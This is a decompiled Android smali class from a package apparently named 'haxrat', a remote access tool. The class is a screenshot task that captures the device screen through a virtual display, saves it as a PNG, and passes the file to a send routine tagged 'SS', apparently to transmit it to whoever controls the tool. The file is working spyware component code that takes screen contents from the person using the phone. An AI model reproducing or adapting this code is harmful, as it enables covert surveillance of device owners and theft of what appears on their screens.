.class Lcom/hax4us/haxrat/Screenshot$100000001$100000000;
.super Landroid/os/AsyncTask;
.source "Screenshot.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/Screenshot$100000001;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000000"
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Landroid/graphics/Bitmap;",
        ">;"
    }
.end annotation


# instance fields
.field private final this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

.field private final val$height:I

.field private final val$reader:Landroid/media/ImageReader;

.field private final val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

.field private final val$width:I

.field private final val$windowSize:Landroid/graphics/Point;


# direct methods
.method constructor <init>(Lcom/hax4us/haxrat/Screenshot$100000001;Landroid/media/ImageReader;IILandroid/graphics/Point;Landroid/hardware/display/VirtualDisplay;)V
    .locals 10

    move-object v0, p0

    move-object v1, p1

    move-object v2, p2

    move v3, p3

    move v4, p4

    move-object v5, p5

    move-object/from16 v6, p6

    move-object v8, v0

    invoke-direct {v8}, Landroid/os/AsyncTask;-><init>()V

    move-object v8, v0

    move-object v9, v1

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    move-object v8, v0

    move-object v9, v2

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$reader:Landroid/media/ImageReader;

    move-object v8, v0

    move v9, v3

    iput v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$width:I

    move-object v8, v0

    move v9, v4

    iput v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$height:I

    move-object v8, v0

    move-object v9, v5

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$windowSize:Landroid/graphics/Point;

    move-object v8, v0

    move-object v9, v6

    iput-object v9, v8, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    return-void
.end method

.method static access$0(Lcom/hax4us/haxrat/Screenshot$100000001$100000000;)Lcom/hax4us/haxrat/Screenshot$100000001;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    move-object v0, v3

    return-object v0
.end method


# virtual methods
.method protected varargs doInBackground([Ljava/lang/Void;)Landroid/graphics/Bitmap;
    .locals 20
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 92
    move-object/from16 v1, p0

    move-object/from16 v2, p1

    const/4 v14, 0x0

    check-cast v14, Landroid/media/Image;

    move-object v4, v14

    .line 93
    const/4 v14, 0x0

    check-cast v14, Landroid/graphics/Bitmap;

    move-object v5, v14

    .line 94
    const/4 v14, 0x0

    check-cast v14, Ljava/io/FileOutputStream;

    move-object v6, v14

    .line 96
    move-object v14, v1

    :try_start_0
    iget-object v14, v14, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$reader:Landroid/media/ImageReader;

    invoke-virtual {v14}, Landroid/media/ImageReader;->acquireLatestImage()Landroid/media/Image;

    move-result-object v14

    move-object v4, v14

    .line 97
    move-object v14, v4

    if-eqz v14, :cond_1

    .line 98
    move-object v14, v4

    invoke-virtual {v14}, Landroid/media/Image;->getPlanes()[Landroid/media/Image$Plane;

    move-result-object v14

    move-object v7, v14

    .line 99
    move-object v14, v7

    const/4 v15, 0x0

    aget-object v14, v14, v15

    invoke-virtual {v14}, Landroid/media/Image$Plane;->getBuffer()Ljava/nio/ByteBuffer;

    move-result-object v14

    move-object v8, v14

    .line 100
    move-object v14, v7

    const/4 v15, 0x0

    aget-object v14, v14, v15

    invoke-virtual {v14}, Landroid/media/Image$Plane;->getPixelStride()I

    move-result v14

    move v9, v14

    move-object v14, v7

    const/4 v15, 0x0

    aget-object v14, v14, v15

    invoke-virtual {v14}, Landroid/media/Image$Plane;->getRowStride()I

    move-result v14

    move v10, v14

    move v14, v10

    move v15, v9

    move-object/from16 v16, v1

    move-object/from16 v0, v16

    iget v0, v0, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$width:I

    move/from16 v16, v0

    mul-int v15, v15, v16

    sub-int/2addr v14, v15

    move v11, v14

    .line 101
    move-object v14, v1

    iget v14, v14, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$width:I

    move v15, v11

    move/from16 v16, v9

    div-int v15, v15, v16

    add-int/2addr v14, v15

    move-object v15, v1

    iget v15, v15, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$height:I

    sget-object v16, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static/range {v14 .. v16}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v14

    move-object v5, v14

    .line 102
    move-object v14, v5

    move-object v15, v8

    invoke-virtual {v14, v15}, Landroid/graphics/Bitmap;->copyPixelsFromBuffer(Ljava/nio/Buffer;)V

    .line 104
    move-object v14, v5

    const/4 v15, 0x0

    const/16 v16, 0x0

    move-object/from16 v17, v1

    move-object/from16 v0, v17

    iget-object v0, v0, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$windowSize:Landroid/graphics/Point;

    move-object/from16 v17, v0

    move-object/from16 v0, v17

    iget v0, v0, Landroid/graphics/Point;->x:I

    move/from16 v17, v0

    move-object/from16 v18, v1

    move-object/from16 v0, v18

    iget-object v0, v0, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$windowSize:Landroid/graphics/Point;

    move-object/from16 v18, v0

    move-object/from16 v0, v18

    iget v0, v0, Landroid/graphics/Point;->y:I

    move/from16 v18, v0

    invoke-static/range {v14 .. v18}, Landroid/graphics/Bitmap;->createBitmap(Landroid/graphics/Bitmap;IIII)Landroid/graphics/Bitmap;

    move-result-object v14

    move-object v12, v14

    .line 106
    move-object v14, v12

    move-object v15, v5

    if-eq v14, v15, :cond_0

    .line 107
    move-object v14, v5

    invoke-virtual {v14}, Landroid/graphics/Bitmap;->recycle()V

    .line 108
    :cond_0
    const-string v14, "TAGG"

    const-string v15, "before getFilePath()"

    invoke-static {v14, v15}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v14

    .line 110
    move-object v14, v1

    iget-object v14, v14, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    invoke-static {v14}, Lcom/hax4us/haxrat/Screenshot$100000001;->access$0(Lcom/hax4us/haxrat/Screenshot$100000001;)Lcom/hax4us/haxrat/Screenshot;

    move-result-object v14

    const/4 v15, 0x2

    const/16 v16, 0x0

    invoke-static/range {v15 .. v16}, Lcom/util/extras/Utils;->getFilePath(II)Ljava/io/File;

    move-result-object v15

    iput-object v15, v14, Lcom/hax4us/haxrat/Screenshot;->filePath:Ljava/io/File;

    .line 111
    const-string v14, "TAGG"

    new-instance v15, Ljava/lang/StringBuffer;

    move-object/from16 v19, v15

    move-object/from16 v15, v19

    move-object/from16 v16, v19

    invoke-direct/range {v16 .. v16}, Ljava/lang/StringBuffer;-><init>()V

    const-string v16, "SCREENSHOT : "

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v15

    move-object/from16 v16, v1

    move-object/from16 v0, v16

    iget-object v0, v0, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Lcom/hax4us/haxrat/Screenshot$100000001;->access$0(Lcom/hax4us/haxrat/Screenshot$100000001;)Lcom/hax4us/haxrat/Screenshot;

    move-result-object v16

    move-object/from16 v0, v16

    iget-object v0, v0, Lcom/hax4us/haxrat/Screenshot;->filePath:Ljava/io/File;

    move-object/from16 v16, v0

    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v16

    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v15

    invoke-virtual {v15}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v15

    invoke-static {v14, v15}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v14

    .line 112
    new-instance v14, Ljava/io/FileOutputStream;

    move-object/from16 v19, v14

    move-object/from16 v14, v19

    move-object/from16 v15, v19

    move-object/from16 v16, v1

    move-object/from16 v0, v16

    iget-object v0, v0, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    move-object/from16 v16, v0

    invoke-static/range {v16 .. v16}, Lcom/hax4us/haxrat/Screenshot$100000001;->access$0(Lcom/hax4us/haxrat/Screenshot$100000001;)Lcom/hax4us/haxrat/Screenshot;

    move-result-object v16

    move-object/from16 v0, v16

    iget-object v0, v0, Lcom/hax4us/haxrat/Screenshot;->filePath:Ljava/io/File;

    move-object/from16 v16, v0

    invoke-direct/range {v15 .. v16}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    move-object v6, v14

    .line 113
    move-object v14, v12

    sget-object v15, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v16, 0x64

    move-object/from16 v17, v6

    invoke-virtual/range {v14 .. v17}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v14

    .line 114
    move-object v14, v12

    move-object v1, v14

    .line 124
    :goto_0
    return-object v1

    .line 121
    :cond_1
    :goto_1
    move-object v14, v4

    if-eqz v14, :cond_2

    .line 122
    move-object v14, v4

    invoke-virtual {v14}, Landroid/media/Image;->close()V

    .line 123
    :cond_2
    move-object v14, v1

    iget-object v14, v14, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$reader:Landroid/media/ImageReader;

    invoke-virtual {v14}, Landroid/media/ImageReader;->close()V

    .line 124
    const/4 v14, 0x0

    check-cast v14, Landroid/graphics/Bitmap;

    move-object v1, v14

    goto :goto_0

    .line 114
    :catch_0
    move-exception v14

    move-object v7, v14

    .line 117
    move-object v14, v5

    if-eqz v14, :cond_3

    .line 118
    move-object v14, v5

    invoke-virtual {v14}, Landroid/graphics/Bitmap;->recycle()V

    .line 119
    :cond_3
    move-object v14, v7

    invoke-virtual {v14}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method

.method protected bridge doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    check-cast v4, [Ljava/lang/Void;

    invoke-virtual {v3, v4}, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->doInBackground([Ljava/lang/Void;)Landroid/graphics/Bitmap;

    move-result-object v3

    move-object v0, v3

    return-object v0
.end method

.method protected onPostExecute(Landroid/graphics/Bitmap;)V
    .locals 8
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/graphics/Bitmap;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 128
    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    invoke-super {v3, v4}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 129
    const-string v3, "TAGG"

    new-instance v4, Ljava/lang/StringBuffer;

    move-object v7, v4

    move-object v4, v7

    move-object v5, v7

    invoke-direct {v5}, Ljava/lang/StringBuffer;-><init>()V

    const-string v5, "Got bitmap?"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v4

    move-object v5, v1

    if-nez v5, :cond_1

    const/4 v5, 0x0

    :goto_0
    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Z)Ljava/lang/StringBuffer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v3

    .line 130
    const-string v3, "SS"

    move-object v4, v0

    iget-object v4, v4, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    invoke-static {v4}, Lcom/hax4us/haxrat/Screenshot$100000001;->access$0(Lcom/hax4us/haxrat/Screenshot$100000001;)Lcom/hax4us/haxrat/Screenshot;

    move-result-object v4

    iget-object v4, v4, Lcom/hax4us/haxrat/Screenshot;->filePath:Ljava/io/File;

    invoke-static {v3, v4}, Lcom/util/extras/Utils;->send(Ljava/lang/String;Ljava/io/File;)Z

    move-result v3

    .line 131
    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    if-eqz v3, :cond_0

    .line 132
    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->val$virtualDisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v3}, Landroid/hardware/display/VirtualDisplay;->release()V

    .line 134
    :cond_0
    move-object v3, v0

    iget-object v3, v3, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->this$0:Lcom/hax4us/haxrat/Screenshot$100000001;

    invoke-static {v3}, Lcom/hax4us/haxrat/Screenshot$100000001;->access$0(Lcom/hax4us/haxrat/Screenshot$100000001;)Lcom/hax4us/haxrat/Screenshot;

    move-result-object v3

    invoke-virtual {v3}, Lcom/hax4us/haxrat/Screenshot;->stopSelf()V

    return-void

    .line 129
    :cond_1
    const/4 v5, 0x1

    goto :goto_0
.end method

.method protected bridge onPostExecute(Ljava/lang/Object;)V
    .locals 5

    move-object v0, p0

    move-object v1, p1

    move-object v3, v0

    move-object v4, v1

    check-cast v4, Landroid/graphics/Bitmap;

    invoke-virtual {v3, v4}, Lcom/hax4us/haxrat/Screenshot$100000001$100000000;->onPostExecute(Landroid/graphics/Bitmap;)V

    return-void
.end method
